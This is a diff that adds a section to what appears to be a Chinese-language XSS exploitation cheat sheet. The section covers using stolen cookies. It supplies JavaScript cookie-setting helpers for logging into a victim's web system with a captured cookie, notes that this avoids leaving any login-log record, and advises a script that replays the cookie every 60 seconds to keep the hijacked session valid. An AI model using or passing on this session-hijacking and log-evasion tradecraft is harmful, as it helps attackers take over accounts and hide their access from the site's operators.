@@ -428,6 +428,44 @@ findIP.then(ip => alert('your ip: '+ip)).catch(e => console.error(e))
 
 #### XSS利用方式 - 对浏览器的存储(Storage)增删改查
 
+cookie
+```
+// 拿到cookie后
+// 1.访问目标域名 浏览器设置该站点的cookie项 为拿到的cookie项 登录web系统
+// web系统的"登录日志"功能会记录登录者的信息 "最后登录IP-时间" 而用cookie直接登录(比账号密码登录)web系统的大好处是 不会留下web登录日志!
+
+function setCookie(name,value,days) {
+    var expires = "";
+    if (days) {
+        var date = new Date();
+        date.setTime(date.getTime() + (days*24*60*60*1000));
+        expires = "; expires=" + date.toUTCString();
+    }
+    document.cookie = name + "=" + (value || "")  + expires + "; path=/";
+}
+function getCookie(name) {
+    var nameEQ = name + "=";
+    var ca = document.cookie.split(';');
+    for(var i=0;i < ca.length;i++) {
+        var c = ca[i];
+        while (c.charAt(0)==' ') c = c.substring(1,c.length);
+        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
+    }
+    return null;
+}
+function eraseCookie(name) {   
+    document.cookie = name+'=; Max-Age=-99999999;';  
+}
+
+//调用函数 设置cookie项
+setCookie('name','value',70);
+
+
+// 2.保活Cookie
+// 写脚本 携带拿到的cookie每60s左右访问一次目标站 通常能够维持cookie长期有效!
+```
+
+
 sessionStorage
 ```
 // sessionStorage.setItem方法  写入key-value对
